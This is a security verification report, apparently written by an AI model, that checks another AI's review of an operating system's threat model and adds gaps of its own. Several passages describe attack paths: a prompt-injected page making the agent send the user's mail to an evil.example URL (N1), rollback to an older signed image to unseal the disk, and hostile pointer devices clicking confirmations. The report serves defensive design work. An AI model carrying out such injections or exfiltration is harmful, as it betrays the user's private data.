# Verification of the first security review by Gemini 4 Hydrogen

- **Verifier:** Claude Opus 5.5
- **Date:** 16 November 2026
- **Review judged:** [2026-11-16-security-review-1-gemini-hydrogen.md](2026-11-16-security-review-1-gemini-hydrogen.md) (fifteen findings on [security.md](../architecture/security.md))
- **Documents read:** `Docs` `main` at `c93a623`: `architecture/security.md` (376 lines; the review says 377), `ui.md`, `agent.md`, `memory.md`, `storage.md`, `platform.md`, `web.md`, `gpu.md`, `devices.md`, `wasm-abi.md`, the sections of `kernel.md` and `kernel-interface.md` the review cites (tasks and marks, marks and services, calls between nodes and the receive check, `node_start`, start-up state, debugging and the crash area, IOMMU), `plan/verification.md`, `plan/gates.md`, `plan/pending-decisions.md`, `decisions/README.md`. The WIT contracts of `dodos` at `origin/step0-contracts` (`aab7417`), read with `git show`, and `8bc6509` where the review cites it.
- **Rules:** those of `REVIEW-COMMON.md` of pass 15. I changed nothing in any repository; this file is my only output.

## How to read this report

Each finding of the review is split into its sub-claims. For each sub-claim I checked the quotes at the cited lines, rebuilt the scenario from the text, and checked external facts at their source today. Verdicts:

- **Confirmed**: the quotes are exact, the scenario follows, and it is a gap of the documents.
- **Confirmed, with another correction**: real, but the review's fix or reasoning is wrong; I give the right one.
- **Partly right**: part of it holds; I say which part.
- **Wrong**: I say why, with the line that refutes it.
- **Out of scope by decision**: I name the decision or line.

On the quotes themselves: the review's quotes are almost all verbatim at the cited lines (I checked every one in the findings). The problems are elsewhere: scenarios that do not follow, claims about what the text says that it does not say, facts read from an old version of a source, and findings that the documents already state.

## Summary

| No. | Review's claim, short | Verdict |
|---|---|---|
| 1.1 | `home` in a `none, external` instance leaks private data unconfirmed | Partly right; the real gap is larger and different (N1, N2) |
| 1.2 | Extent-file writes launder marks; long-lived app becomes sticky-marked | Partly right: laundering `untrusted` is wrong (app output is untrusted by default); losing `private` is N1; the sticky long-lived instance is real and `kernel-interface.md:1099` misstates it |
| 2 | Direct scanout hides system indicators and confirmations | Confirmed as an unsettled case; the "gate is broken" dilemma is wrong; card frames and entity are wrong |
| 3.1 | Boot deadlock: TPM driver and key service not in the boot image | Wrong (no cycle: the system zone is unencrypted); a smaller unsettled case remains |
| 3.2 | Compiled code in the cache zone is outside the signed chain | Confirmed, with another correction; the extent-file part is wrong |
| 3.3 | Shared compiled pages across publishers contradict the process boundary | Partly right: not a contradiction, but an unnamed side channel |
| 4.1 | Dictionary-attack protection cannot cover a key unsealed before the session | Confirmed (TCG source); the bus-encryption part is out of scope by line 142 |
| 4.2 | Sealing to the signing key lets any older signed image unseal | Confirmed, with another correction (the cost is already in P-055; the missing piece is an option; the "debugger stub" example is wrong) |
| 5.1 | Hot kernel replacement is unverified | Partly right; stronger form: no call fills the replacement slot at all |
| 5.2 | Crash traces unencrypted on disk; crash area readable by every node | First half confirmed as unsettled (and the black box is the larger asset); second half wrong as stated (first services come from the signed kept image); a real mark channel remains (N6) |
| 5.3 | The syscall code page is misfiled under chain of trust | Wrong: placement, not a finding |
| 6.1 | Hostile pointer or touch devices confirm actions | Confirmed |
| 6.2 | "Accepted at the lock screen" pre-enrols a BadUSB | Partly right: the sentence is ambiguous; one reading is safe |
| 7.1 | Ladybird's shared processes cross the per-site boundary | Partly right: today's Ladybird gives RequestServer, ImageDecoder and AudioServer per site or per renderer; the real gap is Hub, which holds every site's cookies and storage and is not sandboxed |
| 7.2 | Browser assets missing; "site" vs "origin" | Partly right: "site" is undefined; the review's "eTLD+1" is not in the text |
| 7.3 | Signed web apps on LibJS and the JIT exception | Confirmed as an unsettled case |
| 8.1 | llama.cpp's Vulkan path defeats point 13 | Partly right: the gap is that the GPU stack is in neither list (N7), not point 13 |
| 8.2 | Agent memory makes taint permanent | Partly right: the contract makes it deliberate and gives `forget`; what is missing is counting it in known weakness 1 |
| 8.3 | Self-speech filter bypass by a prefix word | Wrong mechanism; the real gap is that the filter covers no video (N3) |
| 9.1 | Supply chain absent from the threat model | Confirmed as a gap of the adversary list; the fix to the maintenance lane reopens D-032 (owner question) |
| 9.2 | Development agents as adversary; branch protection off | Partly right; "branch protection not enabled" is contradicted by the answers recorded on 16 November (P-086 done in practice) |
| 10.1 | Pre-boot DMA before kernel step 2 | Partly right: firmware DMA protection is unstated; "sleep wake" is not a pre-boot window in this design |
| 10.2 | Packages visible, devices not reset at shutdown, installer | Packages: already stated in P-060; shutdown residue: out of scope by line 142 for extraction, otherwise not a finding; installer: not a finding |
| 11 | CaMeL has no section 9.2 | Wrong: true of v1 only; the current version (v2) has 9.2. The real error is section 5.4, which is 6.4 in v2 |
| 12.1 | Wasmtime Spectre: csdb off on aarch64; guard pages; Winch | aarch64: confirmed; guard pages: misleading; Winch: partly right |
| 12.2 | Microsoft will not sign AGPLv3 code | Confirmed as a fact; but the documents already plan an intermediate loader, which can be permissive |
| 12.3 | DMAR RMRR and SATC unhandled | Partly right; a function defect, not a security one; SATC's consequence is the opposite of the review's |
| 13 | Point 2 reopens D-036 without saying so | Wrong: P-041 already says "Blocks. The text of D-036", and security.md:224 states the Meta difference |
| 14 (P1) | Redirects; `home` | Redirects: partly right (a one-line rule); `home`: see 1.1 |
| 14 (P3) | Local backdoored weights | Partly right: row 104 already covers them; point 3 should say so |
| 14 (P4) | A faulty kernel forges another node's task identifier | Wrong: the receive check refuses it (`kernel-interface.md:914`) |
| 14 (P6) | Push-to-talk default missing | Partly right: the off setting exists; "off by default" is a missing option |
| 14 (P7) | Wake word while locked | Not a finding |
| 14 (P13) | Vulkan/GSP | See 8.1 |
| 14 (P14) | Active-context scope | Partly right: a real third option |
| 15 | Stale WIT baseline; P-023 vs P-039 | First half partly right; second half wrong (P-023 is about where system actions run, and it already depends on P-039) |

What the angle missed (section N): N1, the source of the `private` mark is undefined, so the one confirmation that depends on marks never fires as written; N2, the matrix is judged at invoke while the action instance can read private data afterwards; N3, scenario 10 claims a filter that cannot apply to a video; N4 to N10 below.

## Finding by finding

### Finding 1: the `home` collection in action instances

Quotes: `security.md:176-177`, `kernel-interface.md:1072`, `1097-1099`, `wasm-abi.md:52`, `57`, `storage.md:24`, `51`: all verbatim. The step0 contract says the same: "/home is the request's `home` ... `keep`, "/home" and the bound objects are read-only when change is `none`" (`core.wit` at `aab7417`, lines 266-268).

**1.1 Exfiltration through a `none, external` action. Partly right.**

What holds: the matrix is decided when the agent calls `invoke`, on the task's marks at that moment (`actions.wit` at `aab7417`, lines 194-203). Inside the instance, the action can then read `home` and send a `GET`. So within one instance, untrusted input (the instance takes the task's `untrusted` mark with the invoke message, by the sticky rule of `kernel-interface.md:1067`), private data and an external request can meet with no confirmation. The documents do not name this.

What does not follow:
- "Exfiltration": the data goes only to the hosts the manifest lists for that action. The app's own code reads its own `home` and sends it to its own publisher's hosts. A hostile app can already do this from its long-lived instance, which has `home` and its network right (`core.wit` lines 256-260). The residual is the confused deputy: an honest app whose action puts input-chosen parts of `home` into a URL. `security.md:178` already names "data carried in the address", and the contract names "a publisher that lists its own host" (`core.wit` line 280).
- "Reading `home` ... does not trigger a confirmation because the matrix decision was made at invoke entry before the task was marked `private`": nothing in the documents marks the task `private` when the instance reads `home`, before or after. That is the larger gap, N1.
- The review's fix 1 ("do not pass `home` to `none, external` instances") breaks the ordinary case: an action that calls its publisher's API needs the token stored in `home`.

Correction: see N2 (the network service refuses an outgoing request from a sender marked both `private` and `untrusted` unless the task service confirmed it).

**1.2 Laundering through extent files, and the long-lived instance. Partly right.**

- Laundering `untrusted` into the long-lived app: wrong in effect. Whatever the app later hands the agent is untrusted by default (D-035; `security.md:187`; `actions.wit` line 133, "Untrusted for every third-party application"). Losing `untrusted` on the way through `home` changes nothing.
- Losing `private`: real, but not specific to extent files. It is N1: no record written outside a task carries `private`, extent file or not.
- No per-record marks for extent files: the documents do say the storage service "stores the marks with the data" (`kernel-interface.md:1098`) without saying at what grain for an extent file. A small unsettled case; it matters only once N1 is fixed (then marks come from the zone, and the grain stops mattering for `private`).
- The long-lived instance becomes sticky-marked: **confirmed**. A record an action wrote while marked is read back marked (`kernel-interface.md:1098`), and the long-lived instance, attached to no mark-aware task, takes the marks until restarted (`1067`, `1097`). So `kernel-interface.md:1099`, "**Applications** are not concerned: an agent action runs in a fresh instance", is false for the long-lived instance. The cost (an app whose every later output and clipboard item is marked) is what P-058 measures, but P-058 counts "services", not applications.

### Finding 2: direct scanout and system-drawn elements

Quotes: `security.md:13`, `228-236`, `266`, `ui.md:12-13`, `gates.md:18`: verbatim.

**Confirmed as an unsettled case**, with three corrections.

- The case is real. With direct scanout "the surface's buffer is sent to the screen as it is, with no composition and no added frame" (`ui.md:12`). No document says what happens when a confirmation, the secure attention view, or a microphone, camera or capture indicator must appear over such a surface. The actor is the compositor; the two outcomes the text allows are: it keeps scanning out (the indicator is not shown while a background holder records), or it composes again. The only plane the text uses is the cursor's (`ui.md:17`).
- The worst interaction is with point 6. If the "discreet permanent mark while only the detector listens" (`security.md:266`) is adopted, either a full-screen surface never gets direct scanout while the wake word is on, or the mark disappears in full screen. Neither is written.
- The dilemma "or forcing composition breaks the decided 0 frame added gate" is wrong. The gate measures the latency of a full-screen WebGPU surface (`gates.md:18`); composing while a confirmation is up is a different state, which the gate can exclude in one sentence. Standard practice is to leave scanout whenever anything must be drawn above the surface.
- "Card frames" and "the agent's entity" are wrong: they are drawn in the agent's bar and panel, which are not on screen over a full-screen surface unless the agent is called, and then the compositor composes anyway.
- The review's fallback ("a dedicated hardware overlay plane") rests on hardware planes of the NVIDIA core that `gpu.md:33` marks "from memory".

### Finding 3: boot image, cache zone, shared pages

**3.1 Boot deadlock. Wrong.**

Quotes exact (`memory.md:67`, `kernel.md:199`, `storage.md:47-49`). But there is no cycle. The system zone is "No (public, verified)" encrypted (`storage.md:46`). The storage service and disk driver of the boot image can read the system zone, and the service manager can start the TPM driver and the key service from it; then the device zone can be opened. The review's own fix 1 ("or document that the TPM driver + key service reside as plain blobs verified inside the System zone hash") is that answer. "Blocks building" is wrong.

What remains is small: no document writes the order (system zone, then TPM driver and key service, then device zone, then the session and the user zone) or which service holds the unsealed device key. One line in `storage.md` settles it.

**3.2 Compiled code in the cache zone. Confirmed, with another correction.**

`security.md:28`: "All executable code descends from a signed blob. Only the compile service produces machine code, cached by component hash, compiler version and instruction set". The cache zone is "Machine or user", encrypted "Depends on the origin" (`storage.md:48`). A machine-wide compiled entry for a package in the unencrypted packages zone has no signer: the package blob is checked against its publisher's signed manifest, but the compiled code is the compile service's output, found through the machine database. A thief "with the machine, off" who can "boot other media" (`security.md:105`, in scope) can rewrite both the compiled blob and its index entry; the Merkle check then passes against the rewritten root. At the next boot the runtime maps code that no signed blob produced. `security.md:27`, "Every blob is verified on read by its Merkle tree: at reboot, the machine is exactly that hash", is true only for the system zone, whose roots chain to the signed hash.

The extent-file part is wrong: extent files are not blobs, are not executable, and live in the encrypted application zone (`storage.md:51`). There is no contradiction with a sentence about blobs. A residual unsettled case: whether zone encryption is authenticated (tampering detected) or not; no document says.

Correction: the review's fix 2 (an authenticator under a TPM-sealed key) is right in substance. Smallest form: the compile service writes, with each cached entry, a MAC under a key kept in the device zone, over the component hash, compiler version, instruction set and the code's root; the runtime checks it before mapping, and compiles again on failure.

**3.3 Shared compiled pages across publishers. Partly right.**

Not a contradiction: `security.md:22` speaks of address spaces, and the sharing of compiled code is decided (`memory.md:22`, Decided; `storage.md:68`). But the threat model does not name the side channel. Out of scope line 143 covers "covert channels between a marked and an unmarked party" (cooperating parties) and Spectre-type channels; a Flush+Reload-type channel on shared code pages between non-cooperating publishers is neither. Note the bound: a Wasm component cannot run `clflush` and gets a coarse clock only for untrusted content (`security.md:341`); native code (Ladybird, llama.cpp, drivers) can. One line in "Side channels" settles it.

### Finding 4: TPM sealing

**4.1 No dictionary-attack protection before the session. Confirmed, with the bus part out of scope.**

Source: TCG, *TPM 2.0 Library, Part 1: Architecture*, revision 1.59 (8 November 2019), section 19.8, read today: "The authValue for an object receives DA protection unless the object's noDA attribute is SET." Dictionary-attack protection applies to failures of an authorization value. A key unsealed by policy alone, with no value typed by a person, has nothing to fail. The device zone is "available before the session" (`storage.md:49`), so its key cannot depend on the user's code. Row 105, "User and device zones encrypted, disk key sealed in the TPM with its anti-brute-force mechanism", therefore overstates the device zone. The relation between the disk key (`security.md:54`), the user key (`storage.md:50`, "Yes, user key") and the device zone's "TPM key" is not written anywhere; I fold that into the correction.

The parameter-encryption part (sniffing a discrete TPM's bus) is out of scope by `security.md:142` ("bus probing"), and the reference machine's TPM is the Intel fTPM, which has no external bus (`security.md:121`).

**4.2 Rollback to an older signed image. Confirmed, with another correction.**

Source, same document, section on `TPM2_PolicyAuthorize()`: "multiple policies can satisfy TPM2_PolicyAuthorize(), as long as they are all signed with the appropriate key. Only the policy that is currently stored in the NV index can satisfy TPM2_PolicyAuthorizeNV()." So a key sealed "against the signing key of the system and not against its hash" (`security.md:54`) unseals under every image the project ever signed. A thief who boots an older signed image with a known flaw gets the device zone.

Corrections to the review: (1) the cost is already written in P-055, option A: "Costs: any image signed by the project unlocks the disk". What is missing is the option that removes it (a minimum version in an NV index, `TPM2_PolicyAuthorizeNV`, or a monotonic counter raised by security updates). (2) The example "an image with a console or debugger stub enabled" is wrong: the stub exists only in development images, signed only by a developer key (`security.md:40`).

### Finding 5: kernel replacement, crash traces, code page

**5.1 Hot replacement unverified. Partly right; the stronger form is that the slot cannot be filled.**

`kernel-interface.md:1330`: "Kernel image 0 is the boot kernel, 1 the replacement slot"; `1344`: "`busy` if kernel image 1 is asked for and the replacement slot is empty". No call in the contract writes the slot. The fixed part of the machine table, "written once, by the machine start-up ... read-only from then on", records "the place and the SHA-256 of the kept image and of the kernel images" (`kernel-interface.md:788`). So as written, image 1 is known at machine start-up, which means it comes inside the signed boot image, and "a kernel update without a reboot" (`kernel.md:195`; a selling point for servers, `platform.md:119`) can only move to an image that was shipped with the boot. Either that is the intent and the chain of trust holds (say so), or a call is missing, with its authority and its check. "Breaks a guarantee" is wrong: there is no unverified path, because there is no path.

**5.2 Crash traces. First half confirmed as unsettled; second half wrong as stated.**

- On disk: the storage service copies the valid records of the previous boot "to the raw region of the store" (`kernel-interface.md:1556`; `storage.md:38`). A raw region is not a zone, and no document says it is encrypted. The user ring holds up to 512 bytes of `debug_write` text per call (`kernel-interface.md` call table, "Length at most 512"), with task identifiers and marks. The larger asset the review did not see: the black box, "a ring buffer of the last seconds of messages per task, always active, attached to the crash report" (`platform.md:66`). Messages can hold private data; where the report is stored is not written. The review's citation of `platform.md:64` ("crashes skip user cleanup") is beside the point: the line says a crash skips `suspend`.
- Across nodes: the kept frame is in "every start-up space" (`kernel-interface.md:1487`), but a start-up space belongs to a node's first service, which comes from the signed kept image ("flagged as a first service", `1343`). The scenario "if a node's first service ... belongs to a non-system publisher" cannot happen as written. What is real is a mark channel, N6.

**5.3 Code page under "Chain of trust". Wrong.**

A placement question, not a finding: no sentence contradicts another, and the entry check is decided (`kernel.md`, "System calls", Decided on 14 November 2026). It does narrow code-reuse attacks (a call from an injected or JIT page faults), which is why it sits beside "Applications cannot create an executable page".

### Finding 6: hostile input devices

**6.1 Pointer, touch and digitizer devices. Confirmed.**

Row 106 and point 12 name only "a device that types as a keyboard". A confirmation is "answered only by a gesture on it: a click or a touch on the confirmation" (`security.md:214`); the input chain covers USB HID and I2C HID (`ui.md:108`). A device that reports as an absolute pointer can click on a confirmation's button after the 500 ms delay; the button's place is predictable ("drawn ... above the surface concerned", `ui.md:58`). It can also drive the on-screen keyboard (`ui.md:110`) to type a request. Attack 13 should cover it.

**6.2 "Or at the lock screen". Partly right.**

Point 12: "a newly connected keyboard is accepted after a key press on a keyboard already accepted, or at the lock screen". Two readings: (a) a keyboard plugged in while the screen is locked is accepted, which is the review's scenario and is unsafe; (b) a keyboard on which the user types their code at the lock screen is accepted, which is safe, since the attacker does not know the code. The text allows both. The review reads only (a).

### Finding 7: web engine

**7.1 Shared processes. Partly right.**

Source: Ladybird, `Documentation/ProcessArchitecture.md`, branch `master`, read today (the documents verified commit `c8b525e` of 13 November; this may differ slightly). It says: "Each top-level site has a RequestServer of its own in each browsing session"; ImageDecoder is "One per browsing session and site"; AudioServer is "One per renderer". So the review's "RequestServer ... holds cookies/connection pools across sites" and "shared AudioServer" are wrong for today's Ladybird. What is right, and what the threat model misses: Hub "owns the state that must outlive or be shared between renderers: cookies, web storage, blob URLs, permissions", and Hub "is not sandboxed yet". Hub is a cross-site component holding every site's secrets, and it is in neither the trusted list (`security.md:119-133`) nor the bounded list (`135`), where only "web content processes" appear.

**7.2 Assets and "site" versus "origin". Partly right.**

"Site" is used (`security.md:22`, `101`; `web.md:31`, `33`) and never defined, while provenance uses origins (`web:<origin>`). The review asserts that the documents isolate per eTLD+1; the text says no such thing. The gap is the missing definition. Browser data (cookies, storage, passwords) is covered by the asset row "the `home` collection of each application" only if the browser is an application with a `home`, which no document says; Hub holds it in any case (7.1).

**7.3 Web applications on LibJS. Confirmed as an unsettled case.**

`web.md:38-40`: signed web applications get WIT interfaces as ES modules and "run on LibJS". `security.md:28`: "The only exception under discussion is the JIT of the web process". P-052 asks only about "the web content process". Whether a web application holding `os:core` capabilities gets the JIT if P-052 answers A is not settled.

### Finding 8: inference, memory, self-speech

**8.1 Vulkan, NVK, GSP. Partly right.**

The real gap is not point 13: any application with GPU access reaches the same stack. The gap is that the GPU service, the project's NVIDIA glue, the NVK back end and the GSP firmware (`gpu.md:20-26`) appear in neither the trusted list nor the bounded list, although the compositor draws the trusted path through them (`security.md:127`: "wgpu") and the isolation of one GPU client's memory from another's rests on them (`gpu.md:47`, `53`). See N7. "Local model weights missing from what is protected": weak; models are public packages, and a private installation goes into the user zone (`storage.md:83`).

**8.2 Agent memory. Partly right.**

The step0 contract makes it deliberate: a memory entry carries "the writing task's marks plus `private` ... A later task that reads the entry takes these marks back, so an instruction injected once stays untrusted" (`agent.wit` at `aab7417`, lines 163-166), and gives `forget` (line 174). "Every subsequent task becomes permanently untrusted" is overstated: only a task that recalls a marked entry takes the mark (`recall` reads matching entries, line 180). What is missing is in `security.md` itself: known weakness 1 says "marks die with the task" (`279`) without counting that memory carries them across tasks. The CaMeL claim is correct: section 3 of CaMeL (v2) assumes "if there is a memory ... in place, the memory has not been compromised by the adversary".

**8.3 Self-speech filter bypass. Wrong mechanism.**

The filter drops "a request whose text matches what the machine spoke" (`security.md:268`), and the contract keeps "what it spoke" for `speak` and `read-aloud` (`agent.wit` lines 207-219). A prefix word added by the attacker is also spoken by the machine, so the match still holds. The real weaknesses are: the recogniser's transcript differs from the spoken text, so an exact match fails open on ordinary recognition errors; and the filter covers no audio the system did not synthesise (N3). `security.md:268` already calls echo cancellation "a filter, not a guarantee"; "breaks a guarantee" is wrong.

### Finding 9: supply chain

Quotes: `verification.md:35`, `39`, `94`, `95`: verbatim.

**9.1 Confirmed as a gap of the adversary list.** No adversary row covers a compromised dependency, upstream port, firmware blob or CI that an honest signing threshold then signs. Line 148 puts only "a malicious project signing threshold" out of scope. The review's fix (2), dependency PRs reviewed by a human or another family, contradicts D-032 ("the maintenance lane merges alone"), so it is an owner question, not a correction.

**9.2 Partly right.** The review says branch protection, `CODEOWNERS` and the merge queue "are not enabled yet", citing `pending-decisions.md:1256`. The same file records, in the answers of 16 November (line 30): "P-085, P-086: Done in practice. The owner authorised Step 0 on GitHub: the template repository and the rulesets exist; the merge queue waits for the transfer to an organisation". The review quotes that line elsewhere. I did not check the GitHub settings.

### Finding 10: physical access

**10.1 Pre-boot DMA. Partly right.** The kernel turns the IOMMU on at step 2 (`kernel-interface.md:1932`); what the firmware and the first stage do before that is not written, and "IOMMU active before the first driver" (`security.md:106`) says nothing about firmware. One line (firmware DMA protection expected, as a property of the first stage, like secure boot in `kernel-interface.md:1926`) settles it. "Sleep wake" is not a pre-boot window: the desktop has no sleep at first, and resume from s2idle does not leave the kernel (`platform.md:74-75`).

**10.2 Partly right at most.** Packages visible on disk: already stated, P-060, "Costs: anyone with the disk sees which applications are installed"; only the threat-model row lacks it. Device memory after shutdown: extracting a powered-down GPU's memory is a laboratory attack, out of scope by line 142. The installer as an ephemeral session: not a finding (no guarantee named, no scenario).

### Finding 11: CaMeL section 9.2. Wrong, but there is an error nearby

Source: arXiv 2503.18813, read today. The abstract page lists v1 (24 March 2025) and v2 (24 June 2025). `security.md:156` links the unversioned abstract, which serves v2. In v2, the headings are "9 Discussion", "9.1 Past problems with adoption of capabilities", "9.2 De-classification and user fatigue". So "section 9.2" is right for the cited version. The review read v1, where the same text is section 8.2.

The error the review missed: `security.md:283` cites "the control-flow dependencies that CaMeL tracks one by one (section 5.4)". In v2, 5.4 is "CaMeL Interpreter"; "Case study: when data flow becomes control flow" is 6.4 (it was 5.4 in v1). The page mixes the two versions. Correction: "section 6.4". The review's "checked and found correct" list confirms §5.4 against v1, the same mistake.

### Finding 12: external technical facts

**12.1 Wasmtime. aarch64 confirmed; guard pages misleading; Winch partly right.**

Source: Wasmtime documentation, "Security", `docs.wasmtime.dev/security.html`, read today: "Note that on aarch64 the csdb instruction is disabled by default due to its significant performance penalty, but this can be additionally enabled through the use_csdb Cranelift setting." So `security.md:340`, "The Spectre protections of Wasmtime are active", is not true by default on ARM64; the ARM64 port must set `use_csdb`.

The guard-page point is misleading. The same page says the default configuration has no bounds checks on linear memory, and that with "dynamic" memories "Cranelift will insert spectre mitigation for the bounds checks". With guard pages there is no bounds check to speculate past for a 32-bit memory, so the absence of a mitigation there is not a weakness.

Winch: the "Tiers of Support" page lists "Compiler Winch" at tier 1 (x86_64 targets). The page on Spectre names only Cranelift. But Winch does carry the table mitigation: Wasmtime PR #12930 (1 April 2026), "winch: Fix spectre-related table ind...", says "when loading a value from a table when spectre mitigations are enabled ... an extra comparison and conditional move is executed after the original bounds check and load". Whether Winch mitigates `br_table` and the bounds checks of 64-bit memories I could not establish; not checked.

**12.2 Microsoft UEFI signing. Confirmed as a fact; the conclusion is overstated.**

Source: Microsoft, "Updated UEFI Signing Requirements", Windows Hardware Dev Center blog on Tech Community (the version that names the 2023 CAs), read today: "Code submitted for UEFI signing must not be subject to GPLv3 or any license that purports to give someone the right to demand authorization keys to be able to install modified forms of the code on a device. ... For example, GRUB 2 is licensed under GPLv3 and will not be signed." AGPLv3 carries the same installation-information clause as GPLv3 (from memory), so the kernel and system under D-014 cannot be signed by Microsoft directly. But `security.md:58` plans exactly the route that works: "an intermediate loader signed by Microsoft, later". GRUB 2 is GPLv3 and boots on such machines through shim, which is permissive and verifies the next stage with the vendor's key. So "cannot obtain a Microsoft signature" applies only to signing the combined image, which nobody proposes. What `security.md:60` should say: the intermediate loader must not be under GPLv3 or AGPLv3. The claim that the 2011 CA expired in June 2026 is from memory (the page I read does not give the date).

**12.3 RMRR and SATC. Partly right.**

Source: Linux, `include/acpi/actbl1.h` (`master`, read today): `ACPI_DMAR_TYPE_RESERVED_MEMORY = 1`, `ACPI_DMAR_TYPE_SATC = 5`; `drivers/iommu/intel/iommu.c` stores `atc_required` from the SATC flags ("ATS is required").

- RMRR: the kernel reads "only the DRHD entries of the ACPI DMAR table" (`kernel-interface.md:339`), and blocks every device (`1932`). `kernel-interface.md:311` already lets a driver map "reserved regions that a device needs at fixed addresses" into its iospace. What is unwritten is who reads the RMRR list (the platform service, which carries uACPI) and hands it to the driver manager.
- SATC: the review says the flag "prevents blocking/disabling ATS". The source says ATS is *required* for such a device. The contract enables no ATS (`kernel-interface.md:373`, "The kernel enables neither ATS nor PRI nor PASID"). So a device flagged `atc_required` will not work under DodOS. That is a function limit, not a security hole, and it belongs in the open points of the contract.

### Finding 13: point 2 and D-036. Wrong

P-041 already asks "Does D-036 read ..." and says "**Blocks.** The text of D-036". `security.md:224` already says the matrix departs from D-036's literal text and states the Meta difference: "One difference with Meta: a reversible local modification runs without confirmation in a task with both marks ... Meta counts every change of state under [C]". The review's "Furthermore" restates that line.

### Finding 14: the points for the owners

- **Point 1, redirects. Partly right.** If the network service applies "only to the hosts its manifest lists" to each request, a redirect to another host is a new request and is refused. The documents do not say whether the network service follows redirects for a client. One line settles it. `home`: see 1.1 and N2.
- **Point 3, local weights. Partly right.** Row 104 already says a hostile model, without distinction, is "not stopped" in the automatic cells of an unmarked task. Point 3 recommends a remedy for remote models only and does not say the local residual remains. Owner question Q6.
- **Point 4, forged task identifier. Wrong.** The receive check of every message between nodes refuses a send whose stamp does not "carry a task identifier of the sender's node" (`kernel-interface.md:914`). A faulty kernel can name any task of its own node, which `security.md:107` and point 4 already say ("the task identifier and marks it stamps"). The proposed option C (no cross-node messages for agent tasks) cannot hold: the mark-aware services the task reaches (storage, network) may run on other nodes, and their answers cross nodes. Point 4 already recommends co-location "when possible".
- **Point 6. Partly right.** "A setting that turns the wake word off" is already there. "Off by default" is the missing option; it touches the Aligned line "Voice detection is always active" (`agent.md:11`). Owner question Q7.
- **Point 7. Not a finding.** Opening the lock screen by voice reveals nothing; `platform.md:77` is about waking from sleep, not about the lock.
- **Point 14. Partly right.** A scope made of the surfaces open and the applications the user names is a real third option between "everything minus exclusions" and a router. Owner question Q11.

### Finding 15: baselines and cross-links

- **WIT baseline. Partly right.** `security.md:356` lists gaps "against the files at commit `8bc6509`" and says another revision is in progress. That revision exists (`aab7417` on `step0-contracts`). From its commit message and my reading, it answers most rows: provenance per part of the request, `action-info` provenance, the journal's confirmed input, budgets split into sub-tasks, memory provenance, speech provenance, the manifest's hosts and update rules, and the confirmation rules in the `invoke` comment. I did not check the `catalog.wit` rows (icon names, secret fields). The table should say which rows `aab7417` closes.
- **P-023 and P-039. Wrong.** P-023 is "Where the actions of system services run", not the validation of the interface tree; and it already says "**Depends on** P-039", while P-039 says "**Blocks.** The confirmation path; P-023".

## What the angle should have found

**N1. The source of the `private` mark is undefined, so the one confirmation that depends on marks never fires as written (breaks a guarantee).**

The matrix depends on marks in exactly one cell: an external read in a task marked both `untrusted` and `private` (`security.md:205`). Attack 1 relies on it: "It reads the file, which adds `private`" (`security.md:295`). But no document says what makes data private. The kernel stamps the sender's marks (`kernel-interface.md:1063`); the storage service "stores the marks with the data: a record written by a marked call is read back marked" (`1098`). A document the user writes in an editor, a mail stored by a mail client, any file saved by a long-lived application: the writer is attached to no task and has marks 0 (`1046`, `1048`), so the record is stored with marks 0 and read back with marks 0. The contract defines `private` as "derived from the user's private data" (`core.wit` at `aab7417`, line 160) and sets it explicitly only for memory entries (`agent.wit` line 164) and screen contents (`agent.wit` line 287). Scenario, step by step: the agent reads a web page (task `untrusted`); it invokes a mail client's search action, whose instance reads the user's mail from `home` (marks 0) and returns it (marks of the reply: the instance's, so `untrusted` only); the task holds the user's mail but not `private`; the injected page has the agent fetch `https://evil.example/?d=<mail>` through any `none, external` action whose manifest lists that host, or the web; the matrix runs it ("runs unless marked private"). The confirmation D-036 relies on never appears.

Correction: `private` is a property of where data lives, not of who wrote it. The storage service adds `private` to every read from the user, application and snapshot zones (and the device zone), whatever the writer's marks; `untrusted` keeps following the writer and the origin. Cost: almost every task that touches the user's data is `private`, so an external read after an untrusted read is confirmed more often; the injection suite counts it (P-058).

**N2. The matrix is judged at `invoke`, but the instance reads afterwards (unsettled case).**

With N1 fixed, an action instance of class `none, external` invoked in an `untrusted` task that is not yet `private` takes `untrusted` with the invoke message (`kernel-interface.md:1067`), then reads `home` and becomes `private`, then sends a `GET`. The three risks meet inside the instance after the matrix's decision. The network service is mark-aware (`kernel-interface.md:1098`) and sees the sender's marks on each request, but no rule tells it what to do with them. Correction (owner question Q2): the network service refuses (`denied`) an outgoing request from a sender marked both `private` and `untrusted` unless the task service has a confirmation for that call; the task service then confirms at the first such request, with the action's input. This makes the matrix's cell hold at the place where data actually leaves.

**N3. Scenario 10 claims a filter that cannot apply to a video (wrong claim of the text).**

Scenario 10: "A video playing on the machine says the wake word and a command. Echo cancellation subtracts what the machine plays, and the recogniser drops a request that matches its own output (P). Stops at the audio path, by filtering". The recogniser compares with "what the machine spoke" (`security.md:268`), and the contract keeps the text of `speak` and `read-aloud` only (`agent.wit` lines 207-219). A video's sound has no text the system knows, unless the system transcribes everything it plays, which no document proposes. For a video, only echo cancellation applies. And the comparison must tolerate recognition errors, or it fails open on ordinary speech.

**N4. CaMeL section 5.4 should be 6.4** (see Finding 11).

**N5. The replacement kernel slot has no writer** (see 5.1). It touches the chain of trust: either image 1 comes in the signed boot image, or a call fills it under an authority the chain must name.

**N6. The user trace ring carries data from marked to unmarked readers (unsettled case).**

Any holder of the node's `debug` capability writes up to 512 bytes per call into the user ring (`kernel-interface.md`, `debug_write`); "Whoever holds [the kept frame] reads every core's rings and records, without a call" (`1487`), and the log service reads them (`platform.md:70`). Each entry records the writer's effective marks (word 4 of the entry), but no rule says the reader takes them, and the ring is not in the list "What carries no marks" (`kernel-interface.md:1072`). A marked process that holds `debug` passes text to the log service, and from there to whatever the log service hands on unmarked. Correction: the log service is mark-aware and stores each entry with its marks; or the line is added to the list of limits; and the supervisor gives `debug` to no application by default.

**N7. The GPU stack is in neither list (unsettled case).** See 8.1. Correction: add the GPU service, the NVIDIA glue and the NVK back end to the trusted list, with the isolation between GPU clients as their duty, and put the GSP firmware with "the hardware and its firmware" (line 121), so that compromised GPU firmware is out of scope by the same line.

**N8. The black box holds message contents (unsettled case).** See 5.2. "A ring buffer of the last seconds of messages per task ... attached to the crash report" (`platform.md:66`): where it is written, whether encrypted, and what marks the agent takes when it "explains" it, are not written.

**N9. Hub of Ladybird holds every site's cookies and storage** (see 7.1).

